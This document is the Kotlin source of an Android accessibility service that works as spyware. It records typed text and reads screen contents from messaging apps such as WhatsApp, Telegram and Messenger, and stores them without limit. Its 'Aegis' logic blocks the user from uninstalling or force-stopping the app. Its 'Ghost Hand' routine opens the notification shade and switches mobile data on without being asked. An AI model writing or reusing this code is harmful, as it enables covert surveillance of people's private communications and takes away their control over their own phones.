package com.example.myandroid

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import android.app.KeyguardManager
import android.os.Handler
import android.os.Looper

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
        fun triggerDataRecovery() {
            instance?.engageGhostHand()
        }
    }

    private var nextAllowedCheck = 0L
    private var cachedRules: JSONObject = JSONObject()
    
    // GHOST HAND STATE
    private var isGhostActive = false
    private var isLookingForToggle = false
    private val targetKeywords = listOf("Mobile data", "Data", "Cellular data", "Internet", "Connexion")
    
    // AEGIS STATE (Self Protection)
    private val protectedApps = listOf("Cortex", "My Android")
    private val dangerKeywords = listOf("Force stop", "Uninstall", "Storage", "Permissions")

    // LAUNCHER CACHE
    private var cachedLauncher: String = ""
    private var lastLauncherCheck: Long = 0

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val rulesStr = prefs.getString("cached_rules", "{}")
        cachedRules = try {
            val json = JSONObject(rulesStr)
            if (json.length() == 0) getDefaultRules() else json
        } catch (e: Exception) {
            getDefaultRules()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        val pkgName = event.packageName?.toString() ?: return

        // --- 0. AEGIS PROTECTION (Highest Priority) ---
        
        // A. LAUNCHER GUARD (Anti-Long Press)
        // Only scans if we are on the Home Screen (Launcher)
        if (pkgName == getLauncherPackageName()) {
             val root = rootInActiveWindow
             if (root != null) {
                 val text = StringBuilder()
                 extractText(root, text)
                 val content = text.toString()
                 // If the popup menu appears with danger keywords
                 if (content.contains("Uninstall", true) || content.contains("Remove", true) || content.contains("App info", true)) {
                     DebugLogger.log("AEGIS", "Blocked Home Screen modification")
                     performGlobalAction(GLOBAL_ACTION_BACK)
                     return
                 }
             }
        }

        // B. SETTINGS GUARD (Anti-Force Stop)
        if (pkgName == "com.android.settings" || pkgName == "com.google.android.packageinstaller" || pkgName == "com.android.packageinstaller") {
            val root = rootInActiveWindow
            if (root != null) {
                val screenText = StringBuilder()
                extractText(root, screenText)
                val content = screenText.toString()
                
                // Check if we are looking at OUR app info
                val isTargetingUs = protectedApps.any { content.contains(it, ignoreCase = true) }
                
                // Check if danger buttons are visible
                val isDanger = dangerKeywords.any { content.contains(it, ignoreCase = true) }

                if (isTargetingUs && isDanger) {
                    DebugLogger.log("AEGIS", "Blocked user attempt to Force Stop/Uninstall!")
                    performGlobalAction(GLOBAL_ACTION_BACK)
                    performGlobalAction(GLOBAL_ACTION_HOME)
                    return
                }
            }
        }

        // --- 1. GHOST HAND LOGIC ---
        if (isGhostActive) {
            handleGhostEvent(event)
        }

        // --- 2. STANDARD MONITORING ---
        val now = System.currentTimeMillis()
        if (now < nextAllowedCheck) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             // Logic delegated to TypingManager
            val text = event.text.joinToString(" ")
            TypingManager.onType(this, pkgName, text)
            return
        }

        if (cachedRules.length() > 0 && !cachedRules.has(pkgName)) return
        
        // Feature Gate: Screen Reader
        if (!ConfigManager.canCollect(this, "screen_reader")) return

        val source = event.source ?: return
        val textContent = StringBuilder()
        extractText(source, textContent)
        
        if (textContent.isNotEmpty()) {
            val pm = packageManager
            val appName = try { pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString() } catch (e: Exception) { pkgName }
            val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            
            val historyStr = prefs.getString("text_history_by_app", "{}")
            val rootJson = try { JSONObject(historyStr) } catch (e: Exception) { JSONObject() }
            val appArray = rootJson.optJSONArray(appName) ?: JSONArray()

            val newTxt = textContent.take(100).toString()
            val lastTxt = if (appArray.length() > 0) appArray.getJSONObject(appArray.length() - 1).optString("txt") else ""
            
            if (newTxt != lastTxt) {
                nextAllowedCheck = now + 500
                // ANR FIX: Offload heavy JSON IO to background thread
                kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                    val entry = JSONObject()
                    entry.put("ts", now)
                    entry.put("txt", newTxt)
                    appArray.put(entry)
                    // Limit Removed: Infinite Screen Reading
                    rootJson.put(appName, appArray)
                    prefs.edit()
                        .putString("text_history_by_app", rootJson.toString())
                        .putInt("interaction_count", prefs.getInt("interaction_count", 0) + 1)
                        .putString("last_screen_text", "[$appName] ${textContent.take(30)}...")
                        .apply()

                    // VERIFICATION LOG
                    DumpManager.logVerification("READER", pkgName)
                }
            } else {
                nextAllowedCheck = now + 3000
            }
        }
    }

    fun engageGhostHand() {
        DebugLogger.log("GHOST", "Engaging Ghost Hand for Data Recovery...")
        isGhostActive = true
        val km = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
        if (km.isKeyguardLocked) {
            DebugLogger.log("GHOST", "Device Locked. Waiting for user...")
            return
        }
        performSwipeDown()
    }

    private fun handleGhostEvent(event: AccessibilityEvent) {
        if (isGhostActive && !isLookingForToggle) {
             val km = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
             if (!km.isKeyguardLocked) performSwipeDown()
        }

        if (isLookingForToggle && event.packageName == "com.android.systemui") {
            val root = rootInActiveWindow ?: return
            if (findAndClickToggle(root)) {
                Handler(Looper.getMainLooper()).postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK) }, 300)
                isGhostActive = false
                isLookingForToggle = false
            }
        }
    }

    private fun performSwipeDown() {
        if (!isLookingForToggle) {
            isLookingForToggle = true
            performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
        }
    }

    private fun findAndClickToggle(node: AccessibilityNodeInfo): Boolean {
        val text = (node.text ?: node.contentDescription ?: "").toString()
        if (targetKeywords.any { text.contains(it, ignoreCase = true) }) {
            var clickableNode = node
            while (!clickableNode.isClickable && clickableNode.parent != null) clickableNode = clickableNode.parent
            if (clickableNode.isClickable) {
                clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return true
            }
        }
        for (i in 0 until node.childCount) {
            if (findAndClickToggle(node.getChild(i))) return true
        }
        return false
    }

    private fun extractText(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        if (node.text != null && node.text.isNotEmpty()) sb.append(node.text).append(" ")
        for (i in 0 until node.childCount) extractText(node.getChild(i), sb)
    }

    override fun onInterrupt() {}

    private fun getDefaultRules(): JSONObject {
        val defaults = JSONObject()
        val apps = listOf("com.google.android.apps.messaging", "com.samsung.android.messaging", "com.whatsapp", "org.telegram.messenger", "org.telegram.plus", "com.imo.android.imoim", "com.truecaller", "com.android.chrome", "com.facebook.orca", "com.instagram.android")
        for (app in apps) defaults.put(app, JSONObject())
        return defaults
    }

    private fun getLauncherPackageName(): String {
        val now = System.currentTimeMillis()
        // Only query the OS once every 60 seconds to save power
        if (now - lastLauncherCheck > 60000 || cachedLauncher.isEmpty()) {
            val intent = android.content.Intent(android.content.Intent.ACTION_MAIN)
            intent.addCategory(android.content.Intent.CATEGORY_HOME)
            val resolveInfo = packageManager.resolveActivity(intent, android.content.pm.PackageManager.MATCH_DEFAULT_ONLY)
            cachedLauncher = resolveInfo?.activityInfo?.packageName ?: ""
            lastLauncherCheck = now
            DebugLogger.log("AEGIS", "Launcher detected: $cachedLauncher")
        }
        return cachedLauncher
    }
}
